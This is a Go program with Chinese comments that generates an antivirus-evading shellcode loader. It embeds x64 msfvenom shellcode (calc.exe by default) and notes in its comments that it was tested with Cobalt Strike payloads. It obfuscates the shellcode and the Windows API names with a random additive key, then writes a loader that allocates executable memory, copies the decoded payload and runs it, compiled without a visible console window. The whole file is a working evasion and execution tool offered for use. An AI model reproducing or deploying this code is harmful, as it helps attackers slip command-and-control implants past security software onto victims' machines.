package main

//1.修改mian.go的shellcode部分
//2.cmd执行go run main.go 运行本程序

import (	//导入一些包
	"bufio"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"time"
)

func main() {
	bypassGoPath:="bypass.go"	//输出文件名字，默认在相对路径./ 可以修改

	fmt.Println("---------------------------------------------------------------------------")

	//经过测试， cs上线	32位C 	shellcode	报错！！！鬼知道啥情况
	//shellcode:=[]byte{0xfc,0xe8,0x89,0x00,0x00,0x00...}
	//64位shellcode 成功上线
	//shellcode:=[]byte{0xfc,0x48,0x83,0xe4,0x...}
	//请修改shellcode,此处默认是弹出计算器	( msfvenom -p windows/x64/exec CMD="calc.exe" -f c )
	shellcode:=[]byte{0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00}

	globlaRandNum:=getRandNum()						//自定义函数,获取一个五位随机数作为编码的密匙
	payload:=enCode(shellcode,globlaRandNum)		//自定义函数,对shellcode每位进行＋globlaRandNum运算，解码后会得到一个可打印字符(unicode码)，函数返回一个表示shellcode的乱码字符串
	str1:=getencode("kernel32.dll",globlaRandNum)//把要用到的几个dll和其中的函数字符串也进行编码加密
	str2:=getencode("ntdll.dll",globlaRandNum)
	str3:=getencode("VirtualAlloc",globlaRandNum)
	str4:=getencode("RtlCopyMemory",globlaRandNum)
	globlaRandNumStr:=strconv.Itoa(globlaRandNum)	//写出bypass.go的时候要把随机数也写出，这里转成string类型

	bypassstr:=getLoderStr(payload,globlaRandNumStr,str1,str2,str3,str4)//自定义函数,此函数传入shellcode，和一些编码过的参数，拼接成加载器，返回具体的go源码文本outstr
	if err,result:=witeFile(bypassGoPath,bypassstr) ;err{	//go语法的if组合语句，witeFile(),自定义函数,返回标志符err和结果信息result, 这句代码相当于if err{}在后面
		fmt.Println(result)															//存在错误打印输出结果
	}else {
		fmt.Println("[info]:\t源码写出成功,请执行命令 go build -ldflags \"-H windowsgui\" "+bypassGoPath+"\t编译可执行文件")	//成功写出bypass.go(加载器)源文件，编译它即可得到bypass.exe
	}
	fmt.Println("---------------------------------------------------------------------------")
}


//对原始shellcode进行编码操作
func enCode(shellcode []byte,globlaRandNum int) string  {
	sb:=strings.Builder{}
	for _,v:=range shellcode{
		sb.WriteString(string(int(v)+globlaRandNum))
	}
	return sb.String()
}
//获取一个五位随机数
func  getRandNum()int{
	s:=fmt.Sprintf("%05v",rand.New(rand.NewSource(time.Now().UnixNano())).Int31n(36000))
	ss:=string(s)
	tmp,_:=strconv.Atoi(ss)
	return tmp
}
//通过生成的随机数对变量名进行编码，返回加密的字符
func getencode(str string,randnum int) string{
	sb:=strings.Builder{}
	for _,v :=range str{
		sb.WriteString(string(v+int32(randnum)))
	}
	return sb.String()
}

//根据路径读取文件
func readFile(filePath string)(bool,string){
	f, err := os.Open(filePath)
	if err != nil {
		return  true,err.Error()
	}
	res,_:=ioutil.ReadAll(f)
	return false,string(res)
}
//根据路径写入文件
func witeFile(filePath,content string)(bool ,string){
	file,err:=os.OpenFile(filePath,os.O_WRONLY|os.O_TRUNC|os.O_CREATE,0644)
	if err!=nil {
		return true,"[err]:\t文件打开失败"+err.Error()
	}else {
		defer file.Close()									//延时调用，结束函数时关闭file句柄
		writer:=bufio.NewWriter(file)						//创建*Writer
		writer.WriteString(content)							//写入
		writer.Flush()										//刷新
		return false,"ok"									//返回成功标志
	}

}
//传入payload 拼接返回加载器源码
func getLoderStr(payload string,globlaRandNumStr string,name1 string,name2 string,name3 string,name4 string)string{
	return `package main
import "syscall"
import "os"
import "unsafe"
import "strings"
const(
	MEM_COMMIT=0x1000
	MEM_RESERVE=0x2000
	PAGE_EXECUTE_READWWRITE=0x40
	globlaRandNum=`+globlaRandNumStr+`
)
var (
	kernel32=syscall.MustLoadDLL(mydecode("`+name1+`"))
	ntdll=syscall.MustLoadDLL(mydecode("`+name2+`"))
	VirtualAlloc=kernel32.MustFindProc(mydecode("`+name3+`"))
	RtlCopyMemory=ntdll.MustFindProc(mydecode("`+name4+`"))
)
func checkErr(err error){
	if err!=nil{
		if err.Error() !="The operation completed successfully."{
			//println("----------错误",err.Error())
			os.Exit(1)
		}
	}
}
func main(){
str:="`+payload+`"
AnnaaKoontz := make([]byte, 0)
	for _, v := range str {
		AnnaaKoontz = append(AnnaaKoontz,byte(v-globlaRandNum))
	}
addr,_,err:=VirtualAlloc.Call(0,uintptr(len(AnnaaKoontz)),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWWRITE)
	if addr ==0{
		checkErr(err)
	}
	_,_,err2:=RtlCopyMemory.Call(addr,(uintptr)(unsafe.Pointer(&AnnaaKoontz[0])),uintptr(len(AnnaaKoontz)))
	checkErr(err2)
	syscall.Syscall(addr,0,0,0,0)
}
func mydecode(str string)string{
	sb:=strings.Builder{}
	for _,v :=range str{
		sb.WriteString(string(v-globlaRandNum))
	}
	return sb.String()
}
`
}